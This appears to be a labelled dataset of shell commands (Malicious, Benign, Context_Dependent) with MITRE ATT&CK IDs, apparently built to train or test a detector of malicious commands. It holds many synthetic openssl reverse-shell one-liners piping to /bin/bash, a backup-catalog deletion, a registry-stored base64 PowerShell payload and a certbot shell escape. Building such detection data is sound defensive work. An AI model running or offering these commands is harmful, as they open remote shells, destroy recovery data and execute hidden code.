command,label,original_label,mitre_id
wbadmin.exe delete catalog -quiet,Malicious,Malicious,T1490
tldr distrobox-list,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.50:445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:8443,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:3306,Malicious,Synthetic,Synthetic
octez-client get balance for alias_or_address,Benign,Benign,Benign
cat $(echo $FILES | sort) | md5sum,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:110 | /bin/bash | openssl s_client -quiet -connect 10.0.0.50:9002,Malicious,Synthetic,Synthetic
jigsaw build,Benign,Benign,Benign
tv list-channels,Benign,Benign,Benign
ncdu,Benign,Benign,Benign
tail -20 /etc/passwd,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:445 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
systemctl status httpd,Context_Dependent,Synthetic,Synthetic
pg_verifybackup [-P|--progress] path/to/backup,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8443 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 172.20.10.8:9090,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:445 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
waitpid pid1 pid2 ...,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:6379,Malicious,Synthetic,Synthetic
bugreportz -p,Benign,Benign,Benign
"powershell.exe -Command ""IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp $registry_key_storage $registry_entry_storage).$registry_entry_storage)))""",Malicious,Malicious,T1027
deno init sample && cd sample && deno test,Benign,Benign,Benign
tcpdump -i eth0 dst 10.10.10.25,Context_Dependent,Synthetic,Synthetic
scp -v /my_folder/my_file.xml user@server_b:/my_new_folder/,Benign,Benign,Benign
systemctl cancel job_id,Benign,Benign,Benign
find . -print0 | xargs -I{} -0 echo {},Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:5432 | /bin/bash | openssl s_client -quiet -connect 172.16.0.10:4445,Malicious,Synthetic,Synthetic
fiascotopnm [-f|--config] path/to/fiascorc path/to/file.fiasco [-o|--output] output_file_basename,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.1:80 user@10.0.0.5,Context_Dependent,Synthetic,Synthetic
cmake path/to/project_directory,Benign,Benign,Benign
"find / -name ""*.txt"" -fstype vfat 2> /dev/null",Context_Dependent,Benign,Benign
tracepath 10.10.10.50,Context_Dependent,Synthetic,Synthetic
certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir . --work-dir . --config-dir . --pre-hook '/bin/sh 1>&0 2>&0',Malicious,Malicious,T1059
tcpdump -i wlan0 -nn,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.50:8081,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.100:80 user@10.0.0.25,Context_Dependent,Synthetic,Synthetic
gs -dQUIET -dBATCH -dNOPAUSE -sDEVICE=pdfwrite -sOutputFile=output.pdf input.pdf,Benign,Benign,Benign
openclaw gateway --allow-unconfigured --port 18789,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:6379 | /bin/bash | openssl s_client -quiet -connect 10.0.0.25:8081,Malicious,Synthetic,Synthetic
setserial -a /dev/cuaN,Benign,Benign,Benign
FindNextUrlCacheEntryA,Malicious,Malicious,T1106
getST.py -hashes LM_Hash:NT_Hash domain/username -spn service/target,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.25:995,Malicious,Synthetic,Synthetic
find . -name '*.png' | grep -f <(sed s?^?/[0-9]_[0-9]_[0-9]_? search.txt) | xargs -i{} cp {} /path/to/dir,Benign,Benign,Benign
reg compare key_name1 key_name2 /os,Benign,Benign,Benign
lure [in|install] package,Benign,Benign,Benign
"if (systemd-detect-virt) then echo ""Virtualization Environment detected""; fi;",Malicious,Malicious,T1497
spa-resample [-f|--format] s8|s16|s32|f32|f64 path/to/input.wav path/to/output.wav,Benign,Benign,Benign
crontab filename,Benign,Benign,Benign
git branch -a,Benign,Synthetic,Synthetic
git secret init,Benign,Benign,Benign
df --total,Benign,Benign,Benign
w [-h|--no-header],Context_Dependent,Benign,Benign
